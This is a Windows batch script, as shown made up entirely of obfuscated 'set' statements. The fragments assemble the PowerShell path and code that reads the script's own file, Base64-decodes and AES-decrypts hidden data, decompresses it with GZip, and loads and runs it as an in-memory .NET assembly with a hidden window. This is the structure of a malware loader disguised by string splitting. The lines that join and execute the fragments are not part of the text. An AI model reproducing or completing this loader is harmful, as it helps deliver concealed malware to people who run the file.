@echo off
set "skWHjLjEdm=py"
set "VvhLhYMbQs= C"
set "qgwondshQG=we"
set "VUWgIqLZnH=rs"
set "zzffUjuuxU=32"
set "DQiwIxKZxC=nd"
set "PorqeViTKs=xe"
set "iBwWROqLlB=Wi"
set "JatkHniMXI=we"
set "wlQlLMwVrf=Po"
set "uViMiTXhNA=ll"
set "EIGrLvjaPv=he"
set "OBNzPXRlhK=st"
set "IdubtVMiHF=\v"
set "gySZeBnFXQ=po"
set "nAyHDgYRCM=rS"
set "CNdkNPSnYi=in"
set "dEIXUJjcog=\W"
set "SBqzqwZzYD=ll"
set "UrrvNMjZqh=0\"
set "jkJlPgjyDJ=ow"
set "LNRzzoMsAZ=he"
set "tElMdnMjnm=y "
set "HaPoOUdEPG=Sy"
set "FShCqGoeso=em"
set "SSLFBWmADB=co"
set "LlbydzAlbZ=:\"
set "DwOmHakkHH=ws"
set "NFsEBIAfCR=1."
set "DxbImmBLqN=.e"
set "kXCeeuYlUs=s\"
set "AQlYnZLkYO= /"
set "GZmBhowIEG=do"
set "xYOAYOomRG=cd"
set "QcyfcmRWPz= %~dp0"
set "oXBIxPYiwK=ress"
set "GNoedDbrwc=y.Cr"
set "KeJMuyRbZR= = $"
set "YGwAyjLJpB=n ''"
set "mJcBuoqZLT=ypto"
set "qdLkMAbaQY=N) {"
set "WaxYuQaTwY=ahaG"
set "FTjyxwhSuj=PKCS"
set "AUEOjDFomv=tum "
set "lJpnkdwxFh=);$X"
set "ecscsxsfiu=$uba"
set "ULGWXkmJRh= [Sy"
set "bimLEtPbpV=-joi"
set "NKiZSWubFf=grap"
set "FqwKGZYnsJ=flec"
set "cheNkDYzBz=pStr"
set "HtKrnWQxJi=yTo("
set "JsMaLoZXoY=morF"
set "fyfRCuHafo=comp"
set "ZpWsiPsGmC=, $X"
set "ZyRfFAlqHZ=trea"
set "vOzjsnRfAh=ect "
set "UzpVboRDMY=Star"
set "ovNnPeFSNL=Syst"
set "nqrRXCuriV=Xaha"
set "wQTYJAUbdo=.-16"
set "ynxrHbcQxG=.Dis"
set "uayUAaoBqb=yste"
set "BXFOghkPOp=G = "
set "diCbGyiZyF=ose("
set "fjnTVALoUo=tion"
set "XwDIjVWgDo=File"
set "EcFJBBcmuL=Comp"
set "niZPTYuYJi=gth)"
set "CsEMlFeYNY=ptor"
set "gHMSymjEog=RmAx"
set "AHRxwMoMUw= [Sy"
set "QkcmrnuCif=rofi"
set "yubJFKQfQe=Wg.I"
set "tONnIfucee=..-1"
set "hChsTecVLk=('%~f0'"
set "UDrUnphdHd=Invo"
set "JjeumGARfZ=V = "
set "XNTNzolaom=;$mf"
set "iCqXZFYqzU=vert"
set "QdgGdUSaQL=ert]"
set "Ubwfwtvmiy=k; }"
set "FzWgWXSfHu=urit"
set "TCzqknBRWC=gMod"
set "flAIAGBLlL=;$Zn"
set "UDpGZrimjT=YEB."
set "kPHSUKQWyq=pher"
set "uGPpYGaXKM=$smR"
set "zWtYBrrhIf=ing("
set "WijMycKHBu=l5E7"
set "SbqATFlIuR='gni"
set "VjTzSjyIZG=bjec"
set "WxmDBtvVnu=em.C"
set "GmUIQjeUgG=tS46"
set "ktpJUgNqzs=pose"
set "OVvjcEtFtS=.Con"
set "BZzwhERDzT=yste"
set "ilUHdeGtcc=ct S"
set "JaBrHmovLA=zHhH"
set "dhKyJTTchc=fore"
set "sCREHYdciG=ptog"
set "dktexkEIgV=ay()"
set "BUGTUNBEHd=LcW."
set "LavtqYKbFo=..-1"
set "pwTEibDKTe=eam("
set "GgNDYQYKoB=m(, "
set "mmFaDZqXYC=.Len"
set "UVXYSsmMZQ=Syst"
set "QstoWCFjXH='[-1"
set "tJLbUqkWtD=cW, "
set "wriCcQWPGx=stem"
set "OXNHwKKDPV=QVYE"
set "HFZioXntfw=PTtG"
set "nlBkALoYNW=tem."
set "blrTiCUglq=brea"
set "NARPvnCipX=ose("
set "fnLcHrkddQ=tryP"
set "TjrnahlQdt=Bmor"
set "ysYYUEflZg=.Cry"
set "FOCjWZdzWT=onve"
set "zZqXyexuFV=.Mod"
set "fxbcmRUfkl=ecry"
set "hHSenBNXCz=ew-O"
set "ObtcpiGeQU= New"
set "LKZsMlRTzg=ring"
set "OSYgzzIKui=Stre"
set "aVgPOkTZng=em.I"
set "rNIfkibbEa=gyLc"
set "tqVHBqyDfd=F'[-"
set "XHHnHSgJQH=tsWi"
set "NNAIDlgVWQ=oryS"
set "NJKwuzndfd=XwFW"
set "awVRXeQKpx=e]::"
set "vMBTCEcaDV=W = "
set "BiuPRozTXB=6] -"
set "vTqctASDrQ=nirt"
set "YWyjnNVijx=]::C"
set "SFKACEoUjk=);$X"
set "XRhmRxgOMx=hy.A"
set "EsBKlNmDHe=.IO."
set "tHKOAeGfwG=[Sys"
set "EKxjXOfuzl=pose"
set "yQAsfQcucR=-joi"
set "ZsDZFcFeJj=IDIH"
set "EJzYzVypsn=]::N"
set "tItbnJGDMy=rtS4"
set "gXbDiVpbvC=6esa"
set "GurgrfgTaO=PxEW"
set "QjGutuWlEY=rans"
set "QwBopSDMGi=daeR"
set "YnFarPNdXM=-1.."
set "lWvDMACyJU=embl"
set "XWmGCmaAWZ=rt]:"
set "jkPszxhwyu=;$gy"
set "lTlxXixhpY=gjYA"
set "XJbNkOPkEM=TllA"
set "TgxPZUZMsY=1..-"
set "uAnhQIwUmb=:('g"
set "YxpDtFpMRH=join"
set "lWBMefnAyh=stem"
set "LDBWeKZMNH=th('"
set "uUwVuVAfTp=in $"
set "gBnXRxpJCy=oArr"
set "RohxWgizvW=pres"
set "SnhbenDfit=esaB"
set "RdcXAArxPM=ubax"
set "OHNamjtMpe=ddin"
set "ofPfQRCKZs=IDIH"
set "OliRCIOVrs=Xaha"
set "UnGLdmxVIj=ptog"
set "MaklWqQmRN=YxVw"
set "zRdfdkowEK=[Sys"
set "JMVfFqZPje=New-"
set "aDCaTTSwMG=[Sys"
set "RvxyEkcgAD=)($X"
set "DlUKsrqgll=oint"
set "cZgIJDFjNP=raph"
set "GCdBzTuFXo=$pyH"
set "QliqwicAgc=$mfw"
set "wCVIxuyUdO=s75K"
set "oMpxDLUCfT=1] -"
set "jbdsKBgdpf=)))"
set "fIxNuRPEwY= = ["
set "IuoUgvLjWF=$Xah"
set "DkqLqpWzuv=pyHL"
set "XxHCCRpCxu=rity"
set "sBejsenCjA=gnir"
set "ogmnqQBrxs== [S"
set "SgXyFxVpBF=m.IO"
set "HVpZRsmGCe=Conv"
set "urzImiyvzs=CW);"
set "iCmorZVsDW=wFWg"
set "qPaVQVjVoU=ateD"
set "wcDXyFiOYm== $X"
set "RRBGpDcyLb=e = "
set "cvAwQPkvkr=ke($"
set "ksTNIMCfDW=stem"
set "RdxwrvtUmp=baxk"
set "jDyLqFKNht=umJE"
set "jrRwMhMyOt=.GZi"
set "XcCHhbFYWz=-Obj"
set "LMEOLwqXJo=[Env"
set "dlahYnroNZ=BC;$"
set "AicCRMpplW='')("
set "lvTPbDflRI=.Sec"
set "aLOcOMJatA=);$M"
set "figlIjsjmk=ment"
set "JjPNwTVaIx=t Sy"
set "hyyedjdcJr=)($c"
set "afWUOZlFao=S46e"
set "WNmNeMqDVx=y]::"
set "YiIIhtpkRa=);$u"
set "ozjAJPguqs=wFWg"
set "MdPyPaDlpA=ct S"
set "IONMdatbSN=.Key"
set "lofOfwpJGr=-nop"
set "hiHruYPvXc=7;$X"
set "QpXEYLqYFz=; };"
set "ZxcNdDdSut=form"
set "ZLIOQYgxMI=wFWg"
set "GqRqeFAKtI='[-1"
set "BbNZusCLHO=m.En"
set "CtbGYfBinN=iron"
set "optNZrroRh= if "
set "eQMZyVamcB=Xaha"
set "VWhEimoVfy=.Cry"
set "zmzZjAvVtw=G, 0"
set "BzzJvSjLwp=mRCW"
set "YqcqSpVBqF=;$Mu"
set "GTtNGWFpmg=nage"
set "zfXehibDeR=zuZI"
set "qnoaggXhxC=.Com"
set "ixDKDDOdvq=);$s"
set "fHwGGanSSo=ss -"
set "yrAOvpTbff=ispo"
set "uTWECorxFg=g.Pa"
set "FoOplxVKMF=Fina"
